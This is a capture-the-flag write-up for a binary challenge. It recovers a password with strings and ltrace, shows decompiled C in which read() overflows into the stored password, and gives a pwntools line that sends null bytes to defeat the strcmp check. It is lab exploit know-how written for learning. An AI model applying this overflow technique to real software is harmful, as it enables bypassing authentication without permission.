# writing-on-the-wall

As you approach a password-protected door, a sense of uncertainty envelops youâ€”no clues, no hints. 
Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. 
Could this be the elusive password, waiting to unveil the door's secrets?

## Solution

```sh
strings writing_on_the_wall | less
# w3tpass H

ltrace ./writing_on_the_wall
```

```
AAAABBBBCCCCDDDDEEEEFFFF, overflows BCCCCDDDDEEEEFFFF

AAAAAAAABBBBBBBBCCCCCCCC, overflows ABBBBBBBBCCCCCCCC
```

```c
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0x2073736170743377;

  read(0,local_1e,7); // overflow

  iVar1 = strcmp(local_1e,(char *)&local_18);
  if (iVar1 == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
```

## Post-CTF

Actually the exploit could have been done by:

```py
pwn.sendlineafter(b">>", "\x00"*7)
```

The null byte comparison was the actual exploit, I found it by chance.
